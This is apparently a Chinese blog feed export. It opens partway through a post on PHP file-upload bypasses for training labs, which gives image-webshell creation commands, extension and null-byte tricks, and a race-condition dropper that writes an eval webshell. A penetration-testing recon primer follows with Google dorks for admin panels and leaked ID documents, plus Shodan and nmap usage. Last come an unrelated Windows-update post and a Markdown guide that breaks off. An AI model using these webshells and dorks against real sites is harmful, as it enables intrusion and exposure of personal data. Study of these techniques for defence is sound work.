文件头绕过</h3><p>一个文件里面的内容到底是啥?用惯了Windows的人肯定是看后缀。但是后缀这个东西说改就改，不可靠。所以，最保险的还是把文件类型信息写到文件里面，通常来说，也就是写到文件开头的那几个字节。这是最方便，最快捷的用来辨别一个文件真实内容的方法。</p><div class="table-container"><table><thead><tr><th>文件名</th><th></th><th>文件头(16进制)</th></tr></thead><tbody><tr><td>JPEG</td><td>ipg</td><td>FFD8FF</td></tr><tr><td>PNG</td><td>png</td><td>89504E47</td></tr><tr><td>GIF</td><td>gif</td><td>47494638</td></tr><tr><td>HTML</td><td>html</td><td>68746D6C3E</td></tr><tr><td>ZIP Archive</td><td>zip</td><td>504B0304</td></tr><tr><td>RAR Archive</td><td>rar</td><td>52617221</td></tr><tr><td>Adobe Acrobat</td><td>pdf</td><td>255044462D312E</td></tr><tr><td>MS Word/Exce</td><td>xls.ordod</td><td>DOCF11E0</td></tr></tbody></table></div><ul><li><strong>方法：生成图片木马</strong></li><li><ol><li>png + php 合成png图马</li></ol></li><li>copy 1.png + 2.php/a 3.png</li><li><ol><li>将shell.php内容追加到pic.php<br>cat shell.php &gt;&gt; pic.png</li></ol></li><li><ol><li>直接echo追加<br>echo ‘&lt;?php phpinfo();?&gt;’ &gt;&gt; pic.png </li></ol></li></ul><h3 id="5-缺陷代码-1"><a href="#5-缺陷代码-1" class="headerlink" title="5.缺陷代码 - 1"></a>5.缺陷代码 - 1</h3><p>网络安全永远处于一个发展更新的状态。因为漏洞是依赖于产品的，产品更新换代，漏洞也会更新换代。而且安全，实际上它是一个博弈的过程，永远有更强的聪明小伙想要制造点新麻烦。如果要是想一劳永逸的话，这个行业可能并不适合。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>，<span class="string">&quot;php5&quot;</span>，<span class="string">&quot;php4&quot;</span>,“<span class="string">&quot;php3&quot;</span>，<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>，<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>，<span class="string">&quot;&quot;</span>，<span class="variable">$nalie</span> ) ;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&#x27;file&#x27;</span>][ <span class="string">&#x27; tmp_name &#x27;</span> ]，UPLOAD_PATH . <span class="variable">$name</span> ))</span><br></pre></td></tr></table></figure><br><strong>题目会将名单中的格式替换为空 格式不区分大小写</strong></p><ul><li><strong>方法</strong>：shell.php - &gt; shell.pphphp</li></ul><h3 id="6-缺陷代码-2"><a href="#6-缺陷代码-2" class="headerlink" title="6.缺陷代码 - 2"></a>6.缺陷代码 - 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>，<span class="string">&quot;php5&quot;</span>，<span class="string">&quot;php4&quot;</span>,“<span class="string">&quot;php3&quot;</span>，<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>，<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$blacklist</span>，<span class="string">&quot;&quot;</span>，<span class="variable">$nalie</span> ) ;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[ <span class="string">&#x27;file&#x27;</span>][ <span class="string">&#x27; tmp_name &#x27;</span> ]，UPLOAD_PATH . <span class="variable">$name</span> ))</span><br></pre></td></tr></table></figure><p><strong>题目会将名单中的格式替换为空格  格式区分大小写</strong></p><ul><li><strong>方法</strong> ：改变格式大小写</li></ul><h3 id="7-GET-型-00-截断"><a href="#7-GET-型-00-截断" class="headerlink" title="7.GET 型 00 截断"></a>7.GET 型 00 截断</h3><p>PHP内核是由C语言实现的，所以使用了C语言中的一些字符串处理函数。比如在连接字符串时候，0字节（\x00)将作为字符串结束符。所以在这个地方，攻击者只要在最后加入一个0字节，就能截断file变量之后的字符串</p><ul><li>这种方法只适用于<br>magicquotes-gpc = Off<br>PHP版本小于5.3.4</li><li><strong>题目会将上传的文件重命名保存</strong></li><li><strong>方法</strong>：用BP截断后添加 X.png%00 进行截断上传</li></ul><h3 id="8-POST-型-00-截断"><a href="#8-POST-型-00-截断" class="headerlink" title="8.POST 型 00 截断"></a>8.POST 型 00 截断</h3><p>需要手动解码</p><ul><li><strong>方法</strong>：添加X.php%00后选中 %00 进行转码选择转成url</li><li>或者输入空格十六进制进制改为00</li></ul><h3 id="9-黑名单缺陷"><a href="#9-黑名单缺陷" class="headerlink" title="9.黑名单缺陷"></a>9.黑名单缺陷</h3><p>白名单是设置能通过的用户，白名单以外的用户都不能通过。黑名单是设置不能通过的用户，黑名单以外的用户都能通过。所以—般情况下白名单比黑名单限制的用户要更多—些</p><ul><li><strong>方法</strong>：BP拦截修改后缀名再放包</li></ul><h3 id="10-条件竞争"><a href="#10-条件竞争" class="headerlink" title="10.条件竞争."></a>10.条件竞争.</h3><p><strong>事件的先后顺序不会影响一个系统的运行结</strong>果。当这些不受控制的事件并<strong>没有按照开发者想要的方式运行</strong>时，就可能会出现bug。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件<strong>竞争漏洞</strong>。<br>攻击者上传了一个用来生成恶意shell的文件，在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意shell的文件。至此，该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功的在服务器中植入了一个shell 文件，后续的一切就都不是问题了。<br>不过竞争的马因为生存周期短的原因，所以和普通的webshell不太一样，他的使命是在有限的生命中等待一个有缘人的光顾，然后快速生成一个小Webshell，落红不是无情物，化作春泥更护花（泪目）。这类的webshell内容大体上如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>不允许直接上传</li><li>先上传再判断然后操作</li><li>CPU - &gt; 时间差</li><li>条件竞争 - &gt; 短时间内多线程大量请求(上传)</li><li><strong>母马-&gt;解析-&gt;释放子马</strong></li><li><ol><li>挑选天选之马(木马)  访问时会将母马写入xaio.php<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;xiao.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_REQUEST[1]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><ol><li>需要条件竞争大量快速上传木马到服务器<br>如果不够快 母马就会被 kill 掉</li></ol></li><li><ol><li>母马需要被解析(条件竞争访问)<br>如果木马上传成功 但是没有访问就不会触发解析 不解析就没有任何作用</li></ol></li><li><ol><li>访问母马释放出来的子马即可 getshell</li></ol></li></ul><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作，所以普通的图片马都难逃被渲染的悲剧，那么有没有那种可以绕过渲染的图片呢?<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>( <span class="variable">$upload_file</span>);</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>( <span class="variable">$upload_file</span>);</span><br><span class="line"><span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>( <span class="variable">$upload_file</span>);</span><br></pre></td></tr></table></figure></p><ol><li>GIF 头部不会被渲染<br>渲染前后的两张GIF，没有发生变化的数据库部分直接插入 Webshell即可</li><li>PNG 对应的脚本绕过<br>PNG没有GIF那么简单，需要将数据写入到PLTE数据块或者<strong>IDAT 数据块</strong></li><li>JPG<br>JPG也需要使用脚本将数据插入到特定的数据库，而且可能会不成功，所以需要多次尝试</li></ol><ul><li><p>渲染两次会返回正确木马</p></li><li><p>JPG坑点总结</p></li><li><ol><li>需要被imagecreatefromjpeg渲染或再用工具</li></ol></li><li><ol><li>图片找的稍微大一点成功率更高 </li></ol></li><li><ol><li>Payload语句越短成功率越高</li></ol></li><li><ol><li>一张图片不行就换一张不要死磕</li></ol></li><li><ol><li>国光补充:貌似白色的图片成功率也比较高</li></ol></li><li><ol><li>&lt;?php $_GET<a href="$_POST[1]">0</a>;?&gt; 这种payload成功率很高</li></ol></li></ul><h3 id="move-uploaded-file"><a href="#move-uploaded-file" class="headerlink" title="move_uploaded_file"></a>move_uploaded_file</h3><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全 - 渗透</title>
      <link href="/post/23577.html/"/>
      <url>/post/23577.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="渗透测试基础"><a href="#渗透测试基础" class="headerlink" title="渗透测试基础"></a>渗透测试基础</h1><p>渗透测试(Penetration Testing)是指受信任的第三方通过模拟黑客的攻击技术与手段对目标网络、系统进行攻击测试，发现目标的安全隐患并给出安全加固建议的一种安全测试与评估方法。</p><h2 id="信息收集技术"><a href="#信息收集技术" class="headerlink" title="信息收集技术"></a>信息收集技术</h2><p>信息收集是渗透测试的第一阶段。在这个阶段，渗透人员需要使用各种方法尽可能地获取到目标资产的相关信息。渗透测试人员可以使用诸如百度或者谷歌这类的传统式搜索引擎来收集信息，也可以借助如<strong>Shodan、Zoomeye</strong>或者<strong>FQFA</strong>这类的物联网搜索引擎，甚至还可以直接使用本地的工具对目标资产进行<strong>操作系统探测、端口扫描、Webr目录扫描、Web指纹识别</strong>等。收集的信息越多，渗透测试成功的概率越高，所以业内常流传着这样一句话“<strong>渗透测试的本质就是信息收集</strong>”。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>信息收集的方式可以分为两种:<strong>主动</strong>和<strong>被动</strong>。</p><ol><li>主动:通过直接访问、扫描网站，这种将流量流经网站的行为。（缺点  会留下痕迹）</li><li>被动:利用第三方暴露在外，主要是互联网的信息进行收集。</li></ol><h3 id="常规收集"><a href="#常规收集" class="headerlink" title="常规收集"></a>常规收集</h3><ul><li><strong>备份文件泄露</strong><br><strong>通过对目录扫描</strong><br>备份文件与缓存文件泄露</li><li><strong>robots.txt泄露</strong></li></ul><h3 id="从信息泄密到未授权访问"><a href="#从信息泄密到未授权访问" class="headerlink" title="从信息泄密到未授权访问"></a>从信息泄密到未授权访问</h3><ul><li><strong>端口扫描与目录扫描</strong><br>开放某些敏感端口，通过burp爆破，遍历搜寻到网站敏感文件</li></ul><h3 id="内网收集"><a href="#内网收集" class="headerlink" title="内网收集"></a>内网收集</h3><ul><li><strong>内网服务器邮箱记录</strong></li><li><strong>浏览器保存密码记录</strong><br>将密码的表单（<strong>密码的类型type</strong>）破坏掉会看到正常的密码显示</li><li><strong>ESXI认证</strong><br>运维管理员登录</li><li><strong>hosts,bash_history等</strong><br>Linux中历史命令记录 ~/.bash_history</li></ul><hr><h2 id="Google-Hack"><a href="#Google-Hack" class="headerlink" title="Google Hack"></a>Google Hack</h2><p>在渗透测试过程中第一步就是信息收集，由于传统的信息收集工具包括指纹识别、目录扫描器等会留下痕迹，某些情况下还会被拦截，因此Google Hack能<strong>在不惊动目标服务器的情况下，对目标网站进行前期最重要的信息收集,并且尽可能的获得更多的信息</strong></p><ul><li><strong>谷歌语法</strong></li></ul><div class="table-container"><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>+</td><td>强制包含某个字符进行查询</td></tr><tr><td>-</td><td><strong>查询的时候忽略某个字符</strong></td></tr><tr><td>“”</td><td>精确匹配双引号内的字符</td></tr><tr><td>*</td><td>匹配任意字符进行查询</td></tr><tr><td>site：</td><td><strong>指定域名</strong></td></tr><tr><td>intext</td><td>正文中存在关键词的网页</td></tr><tr><td>intitle</td><td><strong>标题中存在关键词的网页</strong></td></tr><tr><td>inurl</td><td>URL中存在关键词的网页</td></tr><tr><td>filetype</td><td>搜索指定文件类型</td></tr></tbody></table></div><ul><li><p>寻找后台<br>intitle:后台登录<br>inurl:login |admin|manage |member|admin_login|login_admin|system /login|user|main | cmsinutl: houtai.php | houtai.asp<br>intext:管理|后台|登陆|用户名|密码|系统|帐号</p></li><li><p>查找文件上传点<br>inurl:admin/upfile.asp<br>inurl:admin/upload.asp<br>inurl:Richwidgets/Popup_Upload.aspx</p></li><li><p>查找目录遍历站点<br>intitle : “index of”</p></li><li><p>寻找存在注入的PHP站点 （SQL注入）<br>inurl: “.php?id=” “You have an error in your SQL syntax”</p></li><li><p>寻找互联网上的登录口<br>intitle:登录</p></li><li><p>寻找网站后台<br>intitle:后台登录<br>inurl:login|admin|manage/memberladmin_login|login_admin |system /login |user[main | cmsinutl: houtai.php | houtai.asp<br>inurl:login|admin|manage/memberladmin_login|login_admin |system /login |user[main | cmsinutl: houtai.php | houtai.asp</p></li></ul><h2 id="Google-Hacking-Database"><a href="#Google-Hacking-Database" class="headerlink" title="Google Hacking Database"></a>Google Hacking Database</h2><p>谷歌黑客漏洞<a href="https://www.exploit-db.com/google-hacking-database">Google Hacking Database</a></p><ul><li>找互联网上带有身份证号的敏感文件<br>泄密：<strong>filetype指定搜索类型</strong> xls xlsx pdf doc docx<br>身份证 filetype:xlsx  /  filetype:xlsx 服务器密码</li><li>搜索百度公司相关的登录口</li><li>寻找有漏洞的PHPMyAdmin<br>inurl:/phpmyadmin/index.php 2.11.9.2</li></ul><h2 id="物联网搜索引擎"><a href="#物联网搜索引擎" class="headerlink" title="物联网搜索引擎"></a>物联网搜索引擎</h2><p>物联网搜索引擎也叫网络空间搜索引擎，是对全球网络空间基础设施或网络设备进行扫描，并可以对指纹特征检索的平台。</p><h3 id="Shodan-https-shodan-io"><a href="#Shodan-https-shodan-io" class="headerlink" title="[Shodan] (https://shodan.io/)"></a>[Shodan] (<a href="https://shodan.io/">https://shodan.io/</a>)</h3><ul><li>基本语法</li></ul><div class="table-container"><table><thead><tr><th>关键词</th><th>说明</th></tr></thead><tbody><tr><td>net</td><td>搜索指定ip地址或者子网，c段</td></tr><tr><td>hostname</td><td>搜索指定的域名或者服务器</td></tr><tr><td>port</td><td>搜索开放指定端口的设备</td></tr><tr><td>org</td><td>搜索属于指定组织或者公司的设备</td></tr><tr><td>product</td><td>搜索运行指定产品或者软件操作系统的设备</td></tr><tr><td>version</td><td>指定软件的版本</td></tr><tr><td>isp</td><td>搜索指定isp供应商的设备</td></tr><tr><td>country</td><td>搜索指定国家的设备</td></tr><tr><td>city</td><td>搜索指定城市的设备</td></tr></tbody></table></div><ul><li>应用实例</li></ul><ol><li>查找位于国内的Nginx服务器<br>nginx country:cn</li><li>搜索位南京开启3389端口的服务器<br>port: 3389 city:nanjing</li><li>搜索海康威视摄像头<br>Hikvision-webs country:cn city:nanjing</li><li>查看Cisco思科设备全球分布<br>isp:cisco<br>isp:cisco country:cn</li><li>查看华为设备全球分布<br>isp: huawei</li></ol><ul><li>JAWS摄像头</li><li>JAWS/1.0<h3 id="Zoomeye-https-zoomeye-org"><a href="#Zoomeye-https-zoomeye-org" class="headerlink" title="[Zoomeye] (https://zoomeye.org/)"></a>[Zoomeye] (<a href="https://zoomeye.org/">https://zoomeye.org/</a>)</h3><h3 id="Fofa-https-fofa-so"><a href="#Fofa-https-fofa-so" class="headerlink" title="[Fofa] (https://fofa.so/)"></a>[Fofa] (<a href="https://fofa.so/">https://fofa.so/</a>)</h3></li></ul><hr><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><p>域名爆破是指使用爆破字段拼接主域名尝试访问，暴力破解出主域名下是否还有其他子域名。例如通过某公司官网的主域名，可以暴力破解出该公司内部系统〈如OA、CRM等等）的访问地址。</p><ul><li>搜索引擎   (<strong>谷歌语法</strong>)<br>site: domain</li><li><a href="https://phpinfo.me/domain/">在线子域名查询</a></li><li><a href="https://crt.sh/">证书反查</a></li><li><strong>软件爆破</strong></li><li><ol><li>冷门子域名难以发现</li></ol></li><li><ol><li>2，,4，5,6级域名越来越多 ，爆破难度指数增加</li></ol></li></ul><hr><h2 id="C段与旁站"><a href="#C段与旁站" class="headerlink" title="C段与旁站"></a>C段与<strong>旁站</strong></h2><ul><li>C段也称为C类IP地址，<strong>外网渗透一般到C段</strong></li><li>C段默认子网掩码 255.255.255.0 覆盖ip地址较少</li><li>B类 255.255.0.0 ，A类 255.0.0.0<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3></li><li><strong>Fofa语法</strong>：ip”111.111.111.1/24” &amp;&amp; type=”subdomain”</li><li><strong>kali</strong>：nmap -p 80,8080 111.111.111.1/24</li><li><strong>serversan</strong>：在kali中使用较为方便 ，github上有开源</li></ul><h2 id="服务器信息查询"><a href="#服务器信息查询" class="headerlink" title="服务器信息查询"></a>服务器信息查询</h2><ul><li>DNS：提高解析速度，提高访问速度<br>114.114.114.114 中国通用<br>8.8.8.8 美国谷歌</li><li><strong>nslookup</strong> www.baidu.com<br>解析网站信息</li><li><strong>ping</strong> 测试<br>发包测试网络连通性<br><a href="https://www.aizhan.com/">爱站超级ping</a></li><li><strong>子域名绕过</strong><br>某些站点主站使用CDN，某些子域名未使用，结合之前的子域名爆破收集</li><li><strong>利用站点功能发起请求</strong></li><li><strong>利用网站漏洞</strong><br>某些敏感信息泄密回暴露相关信息</li><li><strong>解析查询历史记录</strong></li><li><strong>国外访问</strong><br>国外代理访问或者国外DNS解析，可能获得真实IP</li></ul><h2 id="社工信息收集"><a href="#社工信息收集" class="headerlink" title="社工信息收集"></a>社工信息收集</h2><ul><li><strong>whois查询</strong></li><li>Chrome查询<br><strong>inurl:t.me 社工库</strong></li><li>密码泄露查询</li><li>TG群信息收集<br>关键词 inurl:t.me</li><li>国家职业资格证查询<br><a href="http://www.ovta.org.cn/">link</a></li><li><strong><strong>GitHub信息搜集</strong></strong><br><del>password</del> 点到为止不多说 </li></ul><h2 id="Nmap-与-Masscan"><a href="#Nmap-与-Masscan" class="headerlink" title="Nmap 与 Masscan"></a>Nmap 与 Masscan</h2><h3 id="Nmap-官网"><a href="#Nmap-官网" class="headerlink" title="Nmap 官网"></a>Nmap <a href="https://nmap.org/">官网</a></h3><p>Nmap 的英文全称是”“”Nmap Network Mapper”，中文翻译过来就是“网络映射器”。Nmap是一款开源的端口扫描神器，它可以快速地扫描大型网络也可以扫描单个主机。<br>端口扫描是指人为发送一组端口扫描信息，试图以了解某台计算机的弱点，并了解其提供的计算机网络服务类型。</p><h4 id="端口介绍"><a href="#端口介绍" class="headerlink" title="端口介绍"></a>端口介绍</h4><ul><li><strong>TCP端口</strong><br>TCP是一种面向有连接的传输协议，只有确认通信对端存在时，才会发送数据，从而可以控制通信流量的浪费。同时，TCP还充分实现数据传输过程中的各种控制，可以再数据丢包的时候重发，还可以对次序乱掉的分包进行顺序控制。</li><li><strong>UDP端口</strong><br>UDP传输不提供复杂的控制机制，它利用IP提供面向无连接的通信服务。UDP报文没有可靠性保证，顺序保证，和流量控制，可靠性比较差，传输过程中即使出现包丢失也不会重发。也正是因为这些，它的资源消耗小，传输速度快，通常音频，视频在传送时用UDP传输较多。</li><li><strong><strong>协议端口</strong></strong><br>端口如同是一个房间的门，这个房间有多少个门呢?有65536个之多，也就是说端口的取值范围是0~65535个。本地操作系统会给那些有需求的进程分配协议端口，每个协议端口有一个正整数标识，如80、139、445等。</li></ul><div class="table-container"><table><thead><tr><th>端口号</th><th>协议</th><th>端口号</th><th>协议</th></tr></thead><tbody><tr><td>21</td><td>FTP</td><td>22</td><td>SSH</td></tr><tr><td>23</td><td>Tenet服务</td><td>25</td><td>SMTP邮件传输协</td></tr><tr><td>80</td><td>HTTP服务相关端口</td><td>110</td><td>POP3 E-mail</td></tr><tr><td>135</td><td>共享文件或共享打印机</td><td>443</td><td>HTTP服务相关常用端口SSL</td></tr><tr><td>445</td><td>文件或打印机共享服务</td><td>1433</td><td>MS SQL Server数据库</td></tr><tr><td>1521</td><td>Oracle 数据库</td><td>3306</td><td>MySQL数据库</td></tr><tr><td>3389</td><td>Windows远程桌面服务</td><td>5432/5433</td><td>PostgreSQL 数据库端口</td></tr><tr><td>6379</td><td>Redis存储默认端口</td><td>7001</td><td>Weblogic默认端口</td></tr><tr><td>8080</td><td>HTTP服务常用端口</td><td>8000-8100</td><td>HTTP服务常用端口</td></tr><tr><td>9200</td><td>Elasticsearch默认端口</td><td>11211</td><td>Memcached 分布式缓存系统端口</td></tr></tbody></table></div><h4 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h4><p>Nmap进行端口扫描的时候，Nmap会把扫描到的端口信息反馈回来，我们从反馈回来的信息就可以判断目标端口情况。<br>kali命令：nmap + 地址</p><div class="table-container"><table><thead><tr><th>状态</th><th>说明</th><th></th></tr></thead><tbody><tr><td>open</td><td>端口对外开放</td><td></td></tr><tr><td>Closed</td><td>端口对外关闭</td><td></td></tr><tr><td>Fitered</td><td>无法判断被防火墙设备拦截过滤</td><td></td></tr><tr><td>Unfiltered</td><td>无法判断被防火墙设备拦截过滤情况</td><td></td></tr><tr><td>Open\</td><td>Filtered</td><td>不能确定开放或者过滤可能被专业设备阻止</td></tr><tr><td>Closed\</td><td>Filtered</td><td>不能确定关闭还是被过滤</td></tr></tbody></table></div><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><div class="table-container"><table><thead><tr><th>选项</th><th>解释</th></tr></thead><tbody><tr><td>-sP</td><td>Ping 扫描</td></tr><tr><td>-PO/-Pn</td><td>无 Ping 扫描</td></tr><tr><td>-PS</td><td>TCP SYN Ping 扫描</td></tr><tr><td>-PA</td><td>TCP ACK Ping 扫描</td></tr><tr><td>-PU</td><td>UDP Ping 扫描</td></tr><tr><td>-PE;-PP;-PM</td><td>ICMP Ping Types扫描</td></tr><tr><td>-PR</td><td>ARP Ping 扫描</td></tr><tr><td>-sL</td><td>列表扫描</td></tr><tr><td>-6</td><td>扫描IPv6地址</td></tr><tr><td>—traceroute</td><td>路由跟踪</td></tr><tr><td>-PY</td><td>SCTP INIT Ping扫描</td></tr></tbody></table></div><h4 id="指纹探测"><a href="#指纹探测" class="headerlink" title="指纹探测"></a>指纹探测</h4><p>Nmap 不仅是一款端口扫描工具，还可以对主机的服务及版本进行识别和探测。<br>命令表:</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-sV</td><td>版本探测</td></tr><tr><td>-A</td><td>更加详细直观的扫描</td></tr><tr><td>—version-intensity</td><td>设置扫描强度1~9默认为7</td></tr><tr><td>—version-light</td><td>轻量级扫描强度为2</td></tr><tr><td>—version-all</td><td>重量级扫描强度为9</td></tr><tr><td>-O</td><td>启用操作系统探测</td></tr></tbody></table></div><ul><li>可以使用—oacket-trace查看协议扫描的细节:</li><li>~ nmap 10.20.24.15 —packet-trace</li><li>可以使用-v查看详细地输出，漫长的扫描的过程就不会显得那么枯燥，而且可以提升逼格。<br>~nmap 10.20.24.15 -v</li></ul><h4 id="使用Zenmap进行扫描"><a href="#使用Zenmap进行扫描" class="headerlink" title="使用Zenmap进行扫描"></a>使用Zenmap进行扫描</h4><p>Zenmap是Nmap官方的图形化界面，比较方便初学者使用的同时也提供了很多高级特性</p><h4 id="时间摸版"><a href="#时间摸版" class="headerlink" title="时间摸版"></a>时间摸版</h4><p>在Nmap提供了一些简单的方法，使用6个时间模板，使用时采用“T选项及数字(0-5)或名称。模板名称有paranoid (0)、 sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)</p><div class="table-container"><table><thead><tr><th>选项</th><th>说明</th></tr></thead><tbody><tr><td>-TO偏执的</td><td>非常慢，用于IDS躲避</td></tr><tr><td>-T1鬼祟的</td><td>缓慢的扫描，用于IDS躲避</td></tr><tr><td>-T2文雅的</td><td>降低了扫描速度以使用更少的带宽和目标主机资源</td></tr><tr><td>-T3普通的</td><td>默认模式根据目标的反应自动调整时间</td></tr><tr><td>-T4野蛮的</td><td>假设用户具有可靠的网络从而加速扫描，可能会漏扫</td></tr><tr><td>-T5疯狂的</td><td>极速扫描，为了获得速度而牺牲准确性</td></tr></tbody></table></div><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><p>项目地址:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h4 id="实用正则"><a href="#实用正则" class="headerlink" title="实用正则"></a>实用正则</h4><h4 id="GOBY-提高探测深度"><a href="#GOBY-提高探测深度" class="headerlink" title="GOBY  提高探测深度"></a>GOBY  提高探测深度</h4><p>官网:<a href="https://cn.gobies.org/">https://cn.gobies.org/</a><br>新一代网络安全技术，通过为目标建立完整的资产数据库，实现快速的安全应急。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>取消Windows自动更新</title>
      <link href="/post/39462.html/"/>
      <url>/post/39462.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>你是不是也常为 win10/win11 弹出的自动更新感到烦恼</p><p>今天帮你彻底解决这个问题</p></blockquote><ul><li>首先介绍一下为什么要关闭系统的自动更新 （当然，系统不完善，有重要的更新是可以手动去更新的）<ol><li>我想没有人会喜欢一个每次开机都会弹更新的电脑吧。</li><li>再者我觉得电脑的自动更新就很讨厌。</li><li>减少硬盘的空间占用。</li><li>还有较为重要的一点，你有没有碰到刚更新完就蓝屏开不了机的情况呢，严重会让你的重要数据损失，是不是很可怕呢。</li><li>还有一个听闻，也不知道是不是真的，某公司为了让硬件的更新换代，会在某次系统更新的时候后淘汰一批硬件，这样给系统更新之后会直接很大的程度上损坏你的硬件设施。</li></ol></li></ul><p>1 . 关闭Windows自动更新服务</p><p>   win+r ——-输入services.msc(服务管理窗口)</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57vuk4sztj30ma08i79e.jpg" alt="image.png"></p><p>   停止windows update服务  并禁用</p><blockquote><p>以为禁用就完了吗，不不不</p></blockquote><p>2 . 同时在恢复改为无操作</p><p><img src="https://pic4.58cdn.com.cn/nowater/webim/big/n_v2a5452332060b4a69a3c8121794862059.png" alt="image-20220815234800460"></p><blockquote><p>你不会以为这样就能完全关闭了吧  还有最后一步哦</p></blockquote><p>3 . win+r ——-输入 gpedit.msc (本地组策略编辑器)</p><p>   管理摸版 - - &gt; Windows组件 - - &gt; Windows更新 - - &gt; 禁用配置自动更新</p><p><img src="https://image.baidu.com/search/down?url=https://tva1.sinaimg.cn/large/008s52kYly1h57vzgqzhij30rp0epn6t.jpg" alt="image.png"></p><blockquote><p>到此，完全关闭 win10/win11 系统的自动更新了</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法</title>
      <link href="/post/3c50d03d.html/"/>
      <url>/post/3c50d03d.html/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Markdown语法总结"><a href="#Markdown语法总结" class="headerlink" title="Markdown语法总结"></a>Markdown语法总结</h1><h2 id="Markdown简介"><a href="#Markdown简介" class="headerlink" title="Markdown简介"></a>Markdown简介</h2><p>学习当然首先要知道Markdown是什么，在菜鸟教程中给出Markdown的定义如下：</p><blockquote><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。</p><p>Markdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。</p><p>Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。</p><p>Markdown 编写的文档后缀为 <strong>.md</strong>, <strong>.markdown</strong>。</p></blockquote><p>我个人编写Markdown时候使用的工具是<strong>Typora</strong> 和<strong>有道云</strong> 笔记，在其<a 